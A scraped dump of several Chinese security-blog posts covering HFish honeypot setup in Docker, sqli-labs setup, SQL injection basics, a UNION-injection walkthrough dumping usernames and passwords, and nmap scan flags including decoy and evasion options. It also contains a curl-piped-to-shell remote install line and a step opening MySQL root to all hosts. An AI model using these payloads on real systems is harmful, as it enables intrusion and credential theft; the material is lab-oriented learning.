12sudo systemctl enable dockersudo systemctl start docker 配置docker 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。 建立 docker 组： 1sudo groupadd docker 将当前用户加入 docker 组： 1sudo usermod -aG docker $USER 测试 Docker 是否安装正确 看是否能正确输出 1docker run --rm hello-world 为靶场部署蜜罐 之前的思路是用vulhub的现成docker靶场，在docker里面安装docker，然后再用这个docker去pull一个现成的独立蜜罐，但是这样会比较麻烦，而且docker部署有问题，所以后来就改变了另外一种方式。用物理机上的docker去搭建了一个蜜罐，作为管理端，然后把靶场docker作为这个蜜罐的子节点。 HFish蜜罐部署，参考以前的blog HFish蜜罐部署 查看靶场部署情况 访问docker靶场 找到容器内的对象的ID 1docker ps 将docker的8080端口映射到本地的8081端口，去访问 1http://127.0.0.1:8081/ 查询容器内系统的IP 1docker inspect [对象ID] 与物理机同一网段下，均可访问到dokcer 在蜜罐管理端添加节点 添加节点，把靶场访问地址填入 1http://192.168.0.71:8081/ 进入靶场bash，输入以下命令，部署蜜罐 1sh -c &quot;$(curl -k http://192.168.0.71:8081//tmp/yW1SuCpRbGl0.sh)&quot; 参考文章docker in docker一个好玩的东西，docker in docker，因为这个Blog的思路就是用docker装靶场，在靶场里面在装一个docker来实现蜜罐的功能，docker in docker的套娃玩意，可以玩玩。🤪 官方dind【docker in docker】镜像 docker从入门到实践 Hfish蜜罐部署","categories":[{"name":"攻防模拟","slug":"攻防模拟","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"蓝队","slug":"攻防模拟/蓝队","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"入侵排查","slug":"入侵排查","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"}],"author":"Gryffinbit"},{"title":"Hfish蜜罐部署","slug":"Hfish蜜罐部署","date":"2022-02-24T19:34:49.000Z","updated":"2024-11-12T06:59:40.000Z","comments":true,"path":"2022/02/25/Hfish蜜罐部署/","permalink":"https://gryffinbit.top/2022/02/25/Hfish%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2/","excerpt":"","text":"Hfish Docker蜜罐部署安装准备实验环境：物理机 Apple M1芯片，2020. macOS Monterey Docker版本： Hfish的介绍GitHub项目：https://github.com/hacklcx/HFish 项目介绍的很清楚了，我就不赘述了 Hfish的部署Docker的安装步骤可以参考之前的blog：sql靶场搭建 获取镜像 1docker pull imdevops/hfish 容器部署 1docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 69:69 -p 3306:3306 -p 5900:5900 -p 6379:6379 -p 8080:8080 -p 8081:8081 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 9200:9200 -p 11211:11211 --restart=always imdevops/hfish:latest 在物理机访问 1http://[本机IP]:9001 初始账户密码： admin admin 修改配置文件 1docker exec -it [容器名] sh 修改管理员账户密码 1vi HFish/config.ini 做个测试，用kali去nmap扫描本机，查看会不会有蜜罐那边的告警 蜜罐搭建成功 最新版本安装 2.8.0 官方安装文档：https://hfish.io/#/2-1-docker?id=docker%e5%ae%89%e8%a3%85%e8%af%b4%e6%98%8e 步骤1：确认已安装并启动Docker 1docker version 步骤2：拉取最新版本的镜像 1docker pull threatbook/hfish-server:latest 步骤3:端口映射、容器部署 12345docker run -d -p 22:22 -p 9090:9090 -p 6379:6379 -p 135:135 -p 139:139 -p 3389:3389 -p 4433:4433 -p 9093:9093 -p 9194:9194 -p 9099:9099 -p 23:23 -p 3307:3307 --name hfish -v /usr/share/hfish:/usr/share/hfish --restart=always --privileged=true threatbook/hfish-server:latestdocker run -d --name hfish -p 22:22 -p 9090:9090 -p 6379:6379 -p 135:135 -p 139:139 -p 3389:3389 -p 4433:4433 -p 9093:9093 -p 9194:9194 -p 9099:9099 -p 23:23 -p 3307:3307 -v /usr/share/hfish:/usr/share/hfish --restart=always --privileged=true threatbook/hfish-server:latest 【数据持久化：在宿主机&#x2F;usr&#x2F;share&#x2F;hfish目录下建立data目录用于存放攻击数据，建立logs目录用于存放日志。】 步骤4：配置后续自动升级（框内全部复制，粘贴，执行即可） 12345678910docker run -d \\ --name watchtower \\ --restart unless-stopped \\ -v /var/run/docker.sock:/var/run/docker.sock \\ --label=com.centurylinklabs.watchtower.enable=false \\--privileged=true \\ containrrr/watchtower \\ --cleanup \\ hfish \\ --interval 3600 【自动升级：每小时请求最新镜像进行升级，升级不会丢失数据。】 步骤5：登陆HFish 登陆地址：https://ip:4433/web/ 初始用户名：admin 初始密码：HFish2021 docker的Hfish连接数据库 我们将数据库搭建在宿主机中，而非docker中，这样为了保护数据安全 dokcer容器内连接宿主机Mysql mac安装mysql 社区版mysql-ARM架构8.0.28 mysql客户端dbeaver 修改配置文件 1vim ~/.bash_profile 在配置文件中输入 1export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin 执行修改后的文件 1source .bash_profile 解决mac重新启动终端source .bash_profile就要输入执行一下.在终端输入：vim ~/.zshrc在文件中输入: source ~/.bash_profile 这样在重新启动终端mysql命令就可以直接执行。 设置宿主机mysql允许docker的虚拟网卡ip访问 在宿主机的终端创建mysql数据库,并允许远程访问 123 mysql -uroot -p# 创建一个叫hfish的数据库create database hfish; 在mysql客户端，进一步创建并设计数据库 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263-- ------------------------------ Table structure for `hfish_info`-- ----------------------------DROP TABLE IF EXISTS `hfish_info`;CREATE TABLE `hfish_info` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `project_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `country` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `region` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `city` varchar(10) NOT NULL, `info` text NOT NULL, `create_time` datetime NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_colony`-- ----------------------------DROP TABLE IF EXISTS `hfish_colony`;CREATE TABLE `hfish_colony` ( `id` int(11) NOT NULL AUTO_INCREMENT, `agent_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent_ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `web_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `deep_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ssh_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `redis_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mysql_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `http_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `telnet_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ftp_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mem_cache_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `plug_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `last_update_time` datetime NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `un_agent` (`agent_name`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_setting`-- ----------------------------DROP TABLE IF EXISTS `hfish_setting`;CREATE TABLE `hfish_setting` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `info` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `update_time` datetime NOT NULL, `status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `setting_name` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `setting_dis` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, PRIMARY KEY (`id`), UNIQUE KEY `index_key` (`type`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of `hfish_setting`-- ----------------------------BEGIN;INSERT INTO `hfish_setting` VALUES (&#x27;1&#x27;, &#x27;mail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;E-mail 群发&#x27;, &#x27;群发邮件SMTP服务器配置&#x27;), (&#x27;2&#x27;, &#x27;alertMail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 18:58:12&#x27;, &#x27;0&#x27;, &#x27;E-mail 通知&#x27;, &#x27;蜜罐告警会通过邮件告知信息&#x27;), (&#x27;3&#x27;, &#x27;webHook&#x27;, &#x27;&#x27;, &#x27;2019-09-03 11:49:00&#x27;, &#x27;0&#x27;, &#x27;WebHook 通知&#x27;, &#x27;蜜罐告警会请求指定API告知信息&#x27;), (&#x27;4&#x27;, &#x27;whiteIp&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;IP 白名单&#x27;, &#x27;蜜罐上钩会过滤掉白名单IP&#x27;);COMMIT;SET FOREIGN_KEY_CHECKS = 1; ![Screen Shot 2022-03-08 at 4.45.33 PM](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-03-08 at 4.45.33 PM.png) 修改宿主机mysql配置，允许外部访问 1，登进MySQL之后， 2，输入以下语句，进入mysql库： 1use mysql 3，更新域属性，’%’表示允许外部访问： 1update user set host=&#x27;%&#x27; where user =&#x27;root&#x27;; 4，执行以上语句之后再执行： 1FLUSH PRIVILEGES; z Hfish连接宿主机mysql数据库 连接成功 参考文章蜜罐搭建踩坑 docker compose官方文档 docker compose菜鸟教程","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"蜜罐","slug":"入侵检测/蜜罐","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E8%9C%9C%E7%BD%90/"}],"tags":[{"name":"蜜罐","slug":"蜜罐","permalink":"https://gryffinbit.top/tags/%E8%9C%9C%E7%BD%90/"},{"name":"Hfish","slug":"Hfish","permalink":"https://gryffinbit.top/tags/Hfish/"}],"author":"Gryffinbit"},{"title":"sql联合查询注入","slug":"sql联合查询注入","date":"2022-02-09T22:10:28.000Z","updated":"2024-11-12T06:59:18.000Z","comments":true,"path":"2022/02/10/sql联合查询注入/","permalink":"https://gryffinbit.top/2022/02/10/sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sql联合查询注入 sql注入的相关基础知识可以参考我之前的BLOG 联合查询的一个思路步骤： 判断注入点 判断注入类型（数字型型or字符型） 判断字段数 判断回显位 确定数据库名 确定表名 确定字段名 拿到数据 用sqli-lab-less1举例 判断注入点 12http://127.0.0.1:8888/Less-1/?id=1&#x27; //报错页面http://127.0.0.1:8888/Less-1/?id=1 //正常页面 所以存在注入点 判断注入点类型 由于报错信息，显示的是单引号闭合问题,并且报错信息显示了传入的参数 若注释了单引号则正常显示。所以判断是字符型注入 判断字段数 输入 12?id=1&#x27; order by 3 //显示正常?id=1&#x27; order by 4 //报错 order by 3之前都显示正常，直到4开始报错，可以判断出字段数有3列 判断回显位 1?id=-1&#x27; union select 1,2,3 --+ 利用联合查询注入.判断出2，3位为显示位 确定数据库名 在显示位，输入想要查询的内容。（数据库常用函数与参数） database() 查询数据库名 1?id=-1&#x27; union select 1,2,database() --+ 爆出全部的库名 1?id=-1&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+ 确定表名 查询的语句为 1?id=-1&#x27; union select 1,database(),table_name from information_schema.tables where table_schema=&#x27;security&#x27; --+ 爆出某个指定数据库的全部表名 1?id=-1&#x27; union all select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&quot;security&quot;--+ 确定字段名 1?id=-1&#x27; union select 1,1,column_name from information_schema.columns where table_name=&#x27;emails&#x27; --+ 爆出指定表的所有字段 1?id=-1&#x27; union all select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=&quot;security&quot; --+ 拿到指定字段的数据 1?id=-1&#x27; union all select 1, group_concat(username),group_concat(password) from users --+ 指定表，拿到这个表里某个字段的数据","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"sql注入的基础知识","slug":"sql注入的基础知识","date":"2022-02-07T23:35:42.000Z","updated":"2024-11-12T06:59:16.000Z","comments":true,"path":"2022/02/08/sql注入的基础知识/","permalink":"https://gryffinbit.top/2022/02/08/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"sql注入的基础知识相关知识information_schema库 MYSQL在5.0版本后，默认会在数据库中存放一个叫”information_schema”的数据库。这个数据库保存了MYSQL中所有数据库的信息，数据库名、数据库的表名、数据库中的表的列名以及访问权限等。 这里需要知道的表有三个: SCHEMATA、TABLES和COLUMNS 其中SCHEMATA表中的SCHEMA_NAME记录了所有数据库的名字 TABLES表中的TABLE_SCHEMA和TABLE_NAME两个字段分别记录了数据库的库名和表名。 COLUMNS表中存储该用户创建的所有数据库的库名、表名和字段名，TABLE_SCHEMA记录了库名、TABLE_NAME记录了表名、COLUMN_NAME记录了字段名。 MYSQL的查询语句 不知道任何条件时 1select column_name from schema_name.table_name; 其中column_name是要查询的字段名，schema_name是库名，table_name是表名 知道一条已知条件时 1select column_name from schema_name.table_name where column_name1=’some_value’; 其中column_name1是已知条件的字段名 知道两条已知条件时 1select column_name from schema_name.table_name where column_name1 = ‘some_value’ and column_name2 = ‘some_value’; 常用函数 database() ： 返回当前数据库名 user() ：返回MYSQL当前用户名 version() ：返回MYSQL的版本 concat() ：联合数据，用于联合两条数据结果。concat(userid,0x3a,username) group_concat() ：和concat()类似，用于将多条数据一次注入出来 hex()和unhex() ：用于hex编码和解码 load_file() ：以文本方式读取文件 注释 行间注释：– 和 # 12select * from user;-select * from user;# 行内注释：/*注释内容*/和 /*! MYSQL专属*/ 其中MYSQL专属的内联注释可以用于整个SQL语句中，其中的SQL代码也会被执行。 1select table_schema,table_name,column_name from columns /*! union* / select 1,2,3; limit limit会返回前面几条或者中间几条数据 1select * from user limit m,n 其m指记录从0开始的第m+1条记录， n指从第m+1条开始取n条记录 对sql注入的一些理解加单引号和加 and 1&#x3D;2有什么区别？ 有区别，单引号是为了闭合语句，而and 1&#x3D;2是为了让union前面的语句无查询结果无输出，然后直接输出拼接进去union后面的那个语句的查询结果； and 是什么意思？ and 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是and连接整个语句返回的是False； or是什么意思？ or 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是or连接整个语句返回的是True and 和 or 选择使用有什么讲究？and 语句执行时，如果and 前的语句返回False,那么and后面的语句根本不执行； limit的作用limit在注入中用于排序然后输出，limit a，b中。a代表从哪个位置（从0开始），b代表从那位开始显示几条数据 sql的注释注释后面的语句，防止sql注入点后原本的sqk语句对sqk注入进行干扰。 %23 编码为#，mysql数据库特有的。把后面的语句全部注释掉 --+ 把后面的语句全部注释掉 /**/ 内联注释，注释指定部分。需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass 1?id=-1&#x27;/**/union/**/select/**/1,2,database()--+ //过滤空格,用/**/代替空格 闭合是什么？ 在sql查询中，代码比较严谨，括号和引号都得成双成对，引号内的默认是字符串不会当作SQL语句执行，所以必须闭合然后才能注入，当然有些SQL语句直接拼接，也就不用什么闭合了； mysql数据库常用函数与参数 &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D;, &#x3D; 比较运算符 and, or 逻辑运算符 version() mysql数据库版本 database() 当前数据库名 sleep() 睡眠时间为指定的秒数 if(true,t,f) if判断 length() 返回字符串的长度 substring() , substr() , mid() 截取字符串.三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度 left() 从左侧开始取指定字符个数的字符串 concat() 没有分隔符的连接字符串 concat_ws() 含有分割符的连接字符串 group_conat() 连接一个组的字符串 ascii() , ord() 返回ASCII码 hex() 将字符串转换为十六进制 unhex() hex的反向操作 md5() 返回MD5值 floor() 返回不大于x的最大整数 round() 返回参数x接近的整数 rand() 返回0-1之间的随机浮点数 load_file() 读取文件，并返回文件内容作为一个字符串 find_in_set() 返回字符串在字符串列表中的位置 benchmark() 指定语句执行的次数 name_const() 返回表作为结果 user() 用户名 current_user() 当前用户名 system_user() 系统用户名 @@datadir 数据库路径 @@version_compile_os 操作系统版本 判断注入点0. 判断闭合在参数后面加单引号报错，并且如果加上注释的话可以正常显示，就是单引号闭合的。 12?id=1&#x27; //报错?id=1&#x27;--+ //正常显示 -- 是sql的注释方式 +号的含义，使用 – （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 –+ 的方式来闭合，因为 + 会被解释成空格。 1. 字符型加单引号在参数后面直接添加单引号，显示数据库错误信息或者页面回显不同说明存在注入点。 同时我们可以看到我们提交的参数两边是有单引号包裹的，所以我们可以判断出注入点的类型是字符型，单引号闭合。 1?id=1&#x27; 出错位置在 &#39;&#39;1&#39;&#39;LIMIT 0,1&#39; 2. 数字型如果传入的参数没有在报错信息中显示，则是数字型。 出错位置在&#39;&#39; LIMIT 0,1&#39; 还可以通过在id后添加运算符，比如-1，+2，这样来观察页面的内容是否会变成对应的id 来判断注入的类型。 注意运算符要进行URL编码 1?id=1%2B1 //1+1 可以发现，id=1+1 和 id=2 显示的页面是一样的 判断显示位知道了当前表的列数我们就开始判断第几列的内容会显示到页面中来。 需要显示位的注入方式： union联合查询注入 没有回显时可以用的注入方式： 报错注入、布尔注入、时间盲注 构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1&#x3D;2 使语句变假，也可以直接将id传入一个负数，来使语句变假。 123?id=-1&#x27; union select 1,2,3 --+ ?id=-1&#x27; union select 1,1,1 --+ //都是一样的，只是为了找到哪一位是显示位?id=1&#x27; and 1=2 union select 1,2,3 --+ 修改显示位的个数，直到能正常显示。 说明显示位是第2位和3位。 (后续就可以利用这两个显示位，把数字2，3换成其他查询语句，获取自己想要的内容，比如database(), version() ) 逻辑运算利用布尔盲注。有时需要一些语句的真假逻辑，这时可以利用 and 1=1 表示真。and 1=2 表示假。 添加了逻辑运算符之后提交，因为1&#x3D;1恒为真，而1&#x3D;2恒为假，所以如果我们的输入带入了数据库，一定会影响到SQL语句的布尔状态，如果两次查询返回的页面不同，说明页面存在布尔状态，此处存在注入漏洞，可以考虑使用布尔盲注进行注入。 判断字段数输入1’ order by 1 --+，显示正常 输入1’ order by 2 --+显示正常 输入1’ order by 3 --+，查询失败 说明字段数只有两列。 寻找注入点 get请求注入 提交数据的方式是GET请求，注入点的参数位于GET参数部分。 1http://www.demo/com/index.php?id=1 post请求注入 提交数据的方式是POST请求，注入点位于POST数据内，通常发生在表单里 cookie注入 注入点的参数位于cookie中 http头注入 注入点位于HTTTP请求头部中的某个字段，例如User-Agent字段中。 常见http注入的参数： 12345678910HTTP_CLIENT_IP&#x27;HTTP_X_FORWARDED_FOR&#x27;&#x27;HTTP_X_FORWARDED&#x27;‘HTTP_X_CLUSTER_CLIENT_IP’‘HTTP_FORWARDED_FOR’‘HTTP_FORWARDED’‘REMOTE_ADDRUser-agentRefererX-Forwarded-For sql注入防御 SQL语句预编译和绑定变量 设置好数据库用户的权限 使用严格的过滤 str_replace()替换过滤 addslashes()函数,添加转义字符 过滤常见危险字符串 htmlspecialchars()函数实体化过滤 一些具体的sql注入方式sql联合查询注入 - Gryffinbit 文章参考SQL注入学习 - zs0zrc MySQL数据库注入攻击方式 | Ulysses’Blog SQL注入注入点判断与注入手法介绍 - FreeBuf网络安全行业门户","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"sqli-lab学习记录【macOS M1】","slug":"sqli-lab学习记录【macOS-M1】","date":"2022-02-05T13:36:12.000Z","updated":"2024-11-12T06:59:15.000Z","comments":true,"path":"2022/02/05/sqli-lab学习记录【macOS-M1】/","permalink":"https://gryffinbit.top/2022/02/05/sqli-lab%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90macOS-M1%E3%80%91/","excerpt":"","text":"sqli-lab靶场学习记录自己开始涉足web，于是从sql注入开始，记录一下sqli-lab靶场的学习过程。以及使用Macos的新芯片M1，遇见的坑和一些安装过程。 实验环境DockerInstall Docker Desktop on Mac | Docker Documentation Docker的下载地址。 M1芯片的，选择Mac with apple chip版本下载。 下载之后双击安装就可以。 安装成功后，在打开终端，查看安装结果 1docker --version 更换镜像源 由于国外docker搭建太慢，国外的安装文档也很全面，所以建议更换为国内的镜像源。 在菜单栏打开偏好设置，preference。找到docker engine，修改一下配置，把下面的内容加进去。 123&quot;registry-mirrors&quot;: [ &quot;https://docker.mirrors.ustc.edu.cn&quot; ], 上面的是中科大的源（我个人觉得是最好用的），以下是其他的源，做备用选择 12345http://hub-mirror.c.163.com //网易https://mirror.ccs.tencentyun.com //腾讯https://reg-mirror.qiniu.com //华为https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors //阿里云需要注册后分配http://f1361db2.m.daocloud.io //DaoCloud镜像 sqli-labs靶场GitHub - Audi-1&#x2F;sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.Sqli-labs 是一个开源且全面的 SQL 注入练习靶场，手工注入必备的练习环境 本次采用docker进行环境的搭建。 直接在 dockerhub 搜索，找下载量比较高（acgpiano&#x2F;sqli-labs）的来安装。 1docker pull acgpiano/sqli-labs 安装成功后开启，并访问 12docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest http://127.0.0.1:8888 //浏览器访问 docker的基本使用 在dockerhub上下载镜像 1docker pull &lt;镜像名字&gt; 运行一个容器 -d 分离模式。 为了使容器继续运行，必须将终端窗口保持打开状态。关闭终端窗口会停止正在运行的容器。这是因为，默认情况下，容器在前台运行，并像从终端调用的任何其他普通程序一样将其自身附加到终端。为了覆盖此行为并保持容器在后台运行，可以在 run 命令中包含 -d 选项 -p 8888:80 这意味着发送到主机系统端口8888 的任何请求都将转发到容器内的端口 80。现在要在浏览器上访问该应用程序，只需访问 http://127.0.0.1:8888 –name 给容器命名 -t 为容器重新分配一个伪输入终端，通常与 -i 同时使用 12docker run -dt --name &lt;自己对容器命名&gt; -p &lt;主机系统端口&gt;:&lt;容器内端口&gt; &lt;pull下来的容器名字&gt; docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest //例如 停止一个容器 其中 container identifier 可以是容器的 ID 或名称。 1docker stop &lt;container identifier&gt; 查看正在运行的容器，以及相关信息 12docker container ls --all docker ps -a 靶场的初始化设置这个容器默认是没初始化 SQLi-labs 数据库的，所以得自己初始化一下。 通过查看容器里面的配置文件，发现 MySQL 的 root 用户的密码为 空，相关版本的细节如下：（从图形界面中找到命令行，并输入以下命令） 1234mysql -e &quot;select version(),user()&quot;php --versioncd /etc/init.d/ &amp;&amp; apache2 -vuname -a HackBar的使用GitHub - fengwenhua&#x2F;hackbar_crack: hackbar 之 Firefox 学习版【一个GitHub的破解项目】 sql注入的相关知识 可以参考我的另一篇Blog","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"},{"name":"MacOS","slug":"MacOS","permalink":"https://gryffinbit.top/tags/MacOS/"},{"name":"M1芯片","slug":"M1芯片","permalink":"https://gryffinbit.top/tags/M1%E8%8A%AF%E7%89%87/"},{"name":"靶场","slug":"靶场","permalink":"https://gryffinbit.top/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"Gryffinbit"},{"title":"linux/macos 上一些常用的命令","slug":"linux-macos-上一些常用的命令","date":"2022-02-05T13:13:06.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/02/05/linux-macos-上一些常用的命令/","permalink":"https://gryffinbit.top/2022/02/05/linux-macos-%E4%B8%8A%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/","excerpt":"","text":"Linux&#x2F;Macos上常用命令收录sql、渗透相关篇base64编码 1echo -n &lt;字符串&gt; | base64 询问当前路径 1pwd docker的基本使用 在dockerhub上下载镜像 1docker pull &lt;镜像名字&gt; 运行一个容器 -d 分离模式。 为了使容器继续运行，必须将终端窗口保持打开状态。关闭终端窗口会停止正在运行的容器。这是因为，默认情况下，容器在前台运行，并像从终端调用的任何其他普通程序一样将其自身附加到终端。为了覆盖此行为并保持容器在后台运行，可以在 run 命令中包含 -d 选项 -p 8888:80 这意味着发送到主机系统端口8888 的任何请求都将转发到容器内的端口 80。现在要在浏览器上访问该应用程序，只需访问 http://127.0.0.1:8888 –name 给容器命名 -t 为容器重新分配一个伪输入终端，通常与 -i 同时使用 12docker run -dt --name &lt;自己对容器命名&gt; -p &lt;主机系统端口&gt;:&lt;容器内端口&gt; &lt;pull下来的容器名字&gt; docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest //例如 停止一个容器 其中 container identifier 可以是容器的 ID 或名称。 1docker stop &lt;container identifier&gt; 查看正在运行的容器，以及相关信息 12docker container ls --all docker ps -a","categories":[{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://gryffinbit.top/tags/linux/"},{"name":"macos","slug":"macos","permalink":"https://gryffinbit.top/tags/macos/"}],"author":"Gryffinbit"},{"title":"Five86-2靶机渗透测试","slug":"Five86-2靶机渗透测试","date":"2022-01-08T13:55:06.000Z","updated":"2024-11-12T06:59:44.000Z","comments":true,"path":"2022/01/08/Five86-2靶机渗透测试/","permalink":"https://gryffinbit.top/2022/01/08/Five86-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Five86-2 靶机渗透测试信息收集Nmap常用参数 1234567891011121314151617181920212223242526272829303132-A :全面扫描. 综合扫描. 是一种完整扫描目标信息的扫描方式. --exclude : 排除指定的地址 例: nmap 192.168.1.0/24 --exclude 192.168.1.1 那么就不会对192.168.1.1进行扫描,--excludefile : 排除指定的地址列表 例: nmap 192.168.1.0/24 --excludefile list.txt 那么就不会对list.txt里面的地址进行扫描,-iL : 扫描一个列表文件 例 nmap -iL list.txt-sP : Ping扫描,效率高,返回信息少. 例: nmap -sP 192.168.1.110 -P0(Pn) :无Ping扫描,可以躲避防火墙防护,可以在目标主机禁止ping的情况下使用-PS :TCP SYN Ping扫描-PA :TCP ACK Ping扫描PR : ARP Ping扫描-n : 禁止DNS反向解析-T : 时序选项, -TO-T5. 用于IDS逃逸,0=&gt;非常慢,1=&gt;缓慢的,2=&gt;文雅的,3=&gt;普通的,4=&gt;快速的,5=&gt;急速的-p : 指定端口扫描-F : 快速扫描-f : 报文分段-D : ip地址欺骗 例 nmap -D RND:5 192.168.1.110 RND:为生成随机ip地址 -sS : TCP SYN 扫描,速度快, 1秒1000次左右. 较为隐蔽.-sT : TCP连接扫描-sU : UDP扫描,扫描非常慢,容易被忽视-sN,-sF : 隐蔽扫描-sI : 空闲扫描,允许端口完全欺骗,可以允许不使用自身ip的情况下发起扫描,非常之隐蔽的扫描.但得先寻找空闲主机,指令为 nmap -p80 -open -script ipidseq 192.168......,第二种是往事随机寻找, nmap -p80 -open -script ipidseq -iR 2000 (iR选项代表随机选择目标.2000带表选择的数量,-open代表只选择端口开放的空闲主机)-p- : 扫描所有端口 1-65535-top-ports : 只扫描开发概率最高的端口 后面跟上数值 例 nmap -top-ports 100 , 就是扫描概率最高的前100个端口&lt;版本探测相关&gt;:-sV : 版本探测 ,通过相应的端口探测对应的服务,根据服务的指纹识别出相应的版本.-sV --allports : 只有使用--allports才能扫描所有的端口,默认情况下回跳过如 TCP9100端口(hp打印机专用端口)--version-intersity : 设置扫描强度 0-9 ,数值越大越有可能被识别,花费时间越多,默认是7--version-ligth : 扫描强度,轻量级扫描(2) ,等用于--version-intersity 2--version-all 